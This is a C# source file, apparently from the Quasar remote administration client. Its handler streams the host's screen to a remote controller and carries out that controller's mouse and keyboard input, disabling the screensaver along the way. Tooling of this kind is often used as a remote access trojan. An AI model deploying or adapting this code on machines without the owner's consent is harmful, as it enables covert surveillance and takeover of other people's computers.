using Quasar.Client.Helper;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using Quasar.Common.Messages.Monitoring.RemoteDesktop;
using Quasar.Common.Messages.other;

namespace Quasar.Client.Messages
{
    public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _desktopData = null;
        private Bitmap _desktop = null;
        private int _displayIndex = 0;
        private ISender _clientMain;
        private Thread _sendFramesThread;

        private readonly Stopwatch _stopwatch = new Stopwatch();
        private int _frameCount = 0;

        public override bool CanExecute(IMessage message) => message is GetDesktop ||
                                                             message is DoMouseEvent ||
                                                             message is DoKeyboardEvent ||
                                                             message is GetMonitors;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDesktop msg:
                    Execute(sender, msg);
                    break;
                case DoMouseEvent msg:
                    Execute(sender, msg);
                    break;
                case DoKeyboardEvent msg:
                    Execute(sender, msg);
                    break;
                case GetMonitors msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetDesktop message)
        {
            if (message.Status == RemoteDesktopStatus.Stop)
            {
                StopScreenStreaming();
            }
            else if (message.Status == RemoteDesktopStatus.Start)
            {
                StartScreenStreaming(client, message);
            }
        }

        private void StartScreenStreaming(ISender client, GetDesktop message)
        {
            Console.WriteLine("Starting remote desktop session");

            var monitorBounds = ScreenHelper.GetBounds(message.DisplayIndex);
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                OnReport("Remote desktop session started");
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            _displayIndex = message.DisplayIndex;
            _clientMain = client;

            if (_sendFramesThread == null || !_sendFramesThread.IsAlive)
            {
                _sendFramesThread = new Thread(() =>
                {
                    _stopwatch.Start();
                    while (true)
                    {
                        CaptureScreen();
                    }
                });
                _sendFramesThread.Start();
            }
        }

        private void StopScreenStreaming()
        {
            Console.WriteLine("Stopping remote desktop session");

            if (_sendFramesThread != null && _sendFramesThread.IsAlive)
            {
                _sendFramesThread.Abort();
                _sendFramesThread = null;
            }

            if (_desktop != null)
            {
                if (_desktopData != null)
                {
                    try
                    {
                        _desktop.UnlockBits(_desktopData);
                    }
                    catch
                    {
                    }
                    _desktopData = null;
                }
                _desktop.Dispose();
                _desktop = null;
            }

            if (_streamCodec != null)
            {
                _streamCodec.Dispose();
                _streamCodec = null;
            }
        }

        private void CaptureScreen()
        {
            _desktop = ScreenHelper.CaptureScreen(_displayIndex);
            _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                ImageLockMode.ReadWrite, _desktop.PixelFormat);

            using (MemoryStream stream = new MemoryStream())
            {
                if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                _streamCodec.CodeImage(_desktopData.Scan0,
                    new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                    new Size(_desktop.Width, _desktop.Height),
                    _desktop.PixelFormat, stream);
                _clientMain.Send(new GetDesktopResponse
                {
                    Image = stream.ToArray(),
                    Quality = _streamCodec.ImageQuality,
                    Monitor = _streamCodec.Monitor,
                    Resolution = _streamCodec.Resolution
                });
            }

            _frameCount++;
            if (_stopwatch.ElapsedMilliseconds >= 1000)
            {
                Console.WriteLine($"FPS: {_frameCount}");
                _frameCount = 0;
                _stopwatch.Restart();
            }
        }


        private void Execute(ISender sender, DoMouseEvent message)
        {
            try
            {
                Screen[] allScreens = Screen.AllScreens;
                int offsetX = allScreens[message.MonitorIndex].Bounds.X;
                int offsetY = allScreens[message.MonitorIndex].Bounds.Y;
                Point p = new Point(message.X + offsetX, message.Y + offsetY);

                // Disable screensaver if active before input
                switch (message.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                    case MouseAction.MoveCursor:
                        if (NativeMethodsHelper.IsScreensaverActive())
                            NativeMethodsHelper.DisableScreensaver();
                        break;
                }

                switch (message.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                        NativeMethodsHelper.DoMouseLeftClick(p, message.IsMouseDown);
                        break;
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                        NativeMethodsHelper.DoMouseRightClick(p, message.IsMouseDown);
                        break;
                    case MouseAction.MoveCursor:
                        NativeMethodsHelper.DoMouseMove(p);
                        break;
                    case MouseAction.ScrollDown:
                        NativeMethodsHelper.DoMouseScroll(p, true);
                        break;
                    case MouseAction.ScrollUp:
                        NativeMethodsHelper.DoMouseScroll(p, false);
                        break;
                }
            }
            catch
            {
            }
        }

        private void Execute(ISender sender, DoKeyboardEvent message)
        {
            if (NativeMethodsHelper.IsScreensaverActive())
                NativeMethodsHelper.DisableScreensaver();

            NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
        }

        private void Execute(ISender client, GetMonitors message)
        {
            client.Send(new GetMonitorsResponse { Number = Screen.AllScreens.Length });
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopScreenStreaming();
                _streamCodec?.Dispose();
            }
        }
    }
}
